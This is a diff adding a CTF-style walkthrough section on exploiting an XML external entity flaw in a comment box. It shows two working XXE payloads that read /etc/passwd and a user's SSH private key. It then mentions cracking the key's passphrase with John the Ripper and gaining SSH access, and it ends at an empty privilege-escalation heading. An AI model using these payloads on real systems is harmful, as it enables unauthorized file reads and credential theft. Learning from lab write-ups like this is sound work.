@@ -137,6 +137,63 @@
 
 ![image](https://github.com/user-attachments/assets/63748d4b-f958-47e7-929e-e9aed80c393b)
 
+### XML EXTERNAL ENTITY to file read
+
+- I checked the source code and found that the textbox allows only xml input.There is also an hint that `user:barry` has a private ssh key. We can test for XXE and try to read Barry's ssh private key.
+
+![image](https://github.com/user-attachments/assets/2bd6788e-42ed-4087-92de-293e3e35c173)
+
+- The file highlighted shows the xml syntax for the textbox
+
+  ![image](https://github.com/user-attachments/assets/fb075e29-8e18-47a9-ad0e-8abec4a34943)
+
+- We will be testing this payload to see if we can read the `/etc/passwd` file
+
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+      <comment>
+        <name>Joe Hamd</name>
+        <author>Barry Clad</author>
+        <com>&example;</com>
+      </comment>
+
+- It worked
+
+![image](https://github.com/user-attachments/assets/d426b918-4937-49d7-b25d-24e3a4fc4072)
+
+- The ssh key should be in this file path `file:///home/barry/.ssh/id_rsa`
+      
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY example SYSTEM "/home/barry/.ssh/id_rsa"> ]>
+      <comment>
+        <name>Joe Hamd</name>
+        <author>Barry Clad</author>
+        <com>&example;</com>
+      </comment>
+
+- Now we have the key
+
+![image](https://github.com/user-attachments/assets/f11aac76-05f7-4259-8437-88e15db350c0)
+
+- I tried to ssh to the host as user `barry` with the private key but it presented a need for passphrase
+
+![image](https://github.com/user-attachments/assets/b4fb4e65-2569-4640-af7b-341a2886ea7c)
+
+- I cracked it with john the ripper but I used `--show` because I have cracked the hash.
+
+![image](https://github.com/user-attachments/assets/2dbacc73-c045-415b-b977-126b0e101b69)
+
+- SSH Access
+
+![image](https://github.com/user-attachments/assets/c71fdd23-148b-40ad-9972-d79fa6988efa)
+
+### Privilege Escalation with path hijacking
+
+
+  
+
+
+
 
 
 
